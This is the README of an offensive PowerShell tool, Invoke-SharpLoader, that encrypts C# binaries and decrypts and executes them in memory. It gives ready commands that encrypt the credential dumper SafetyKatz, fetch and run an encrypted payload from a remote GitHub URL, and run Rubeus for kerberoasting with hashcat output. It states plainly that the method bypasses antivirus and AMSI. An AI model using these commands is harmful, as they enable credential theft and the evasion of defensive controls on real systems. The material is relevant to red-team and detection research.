# Invoke-SharpLoader
Load encrypted and compressed C# Code from a remote Webserver or from a local file straight to memory and execute it there.

Two scripts are used here. Invoke-SharpEncrypt can be used to encrypt existing C# files. To do this, the following example command can be used.

Encrypt C# file:
======
`Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc`

Only full paths to the file are accepted at this point. The encrypted files generated by Invoke-SharpEncrypt can then be hosted on a web server on the Internet or stored on the target system on disk.
Invoke-SharpLoader can be used to decrypt and execute the files in memory. Two examples demonstrate how to load a file from a remote webserver or from disk.

Load from URL:
======
`Invoke-SharpLoader -location https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-SharpLoader/master/EncryptedCSharp/SafetyKatz.enc -password S3cur3Th1sSh1t -noArgs`

Load from DISK:
======
`Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"`

This project was heavily inspired by Cn33liz p0wnedLoader repo here https://github.com/Cn33liz/p0wnedLoader. By encrypting own executables with a 
custom password and hosting them somewhere on the internet nearly all local and Proxy AV-Protections and AMSI can be bypassed. :-)
